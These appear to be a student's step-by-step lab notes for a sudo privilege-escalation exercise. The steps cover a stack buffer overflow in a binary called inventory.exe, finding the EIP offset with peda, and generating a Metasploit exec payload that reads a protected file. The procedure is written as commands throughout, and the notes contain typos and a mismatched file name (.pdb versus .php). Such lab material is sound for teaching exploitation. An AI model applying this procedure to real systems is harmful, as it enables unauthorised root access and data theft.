*** There's a hidden file, /.secret/.verysecret.pdb, on a remote machine that you need, but don't have, sudo access to. However, you do have sudo access to a different hidden file, /.hidden/inventory.exe. SSH into this remote boxto perform a buffer overflow within inventory.exe to determine the EIP, create a metasploit python script to expand the root privileges of that file to the versecret file.

*** On remote target:
(View privileges of fiiles with 'sudo -l')
scp /.hidden/inventory.exe student@10.50.30.0: .
./inventory.exe
> AAAAAAA.....
dmesg | tail -n 3
(find the final 8 characters in sp; this is the EIP. Copy these hex characters - 4 bytes)

*** Backj on home machine
In python Demo.py script: set target as inverse hex bytes
In peda: file inventory.exe (assuming it's already scp'd from the remote)
run
> (normal input a few times)
> AAAAAA..... (break it)
pattern create 100 (copy the result)
run
> (paste output from earlier)
(obtain the 4 bytes next to EIP, without quotes)
pattern offset <value from EIP> (copy the index that's returned)
Get out of peda
msfconsole
search linux/x86
use payload/linux/x86/exec)
set CMD cat /.secret/.verysecret.php
generate -f python -b '\x00\x20\x0a' (these are the common bad hexes) 
(copy the output)

*** back on remote
edit the python script with the proper offset value & paste in python code. Change final comment statement if needed.
./inventory.exe <<< $(python ~/demo.py)
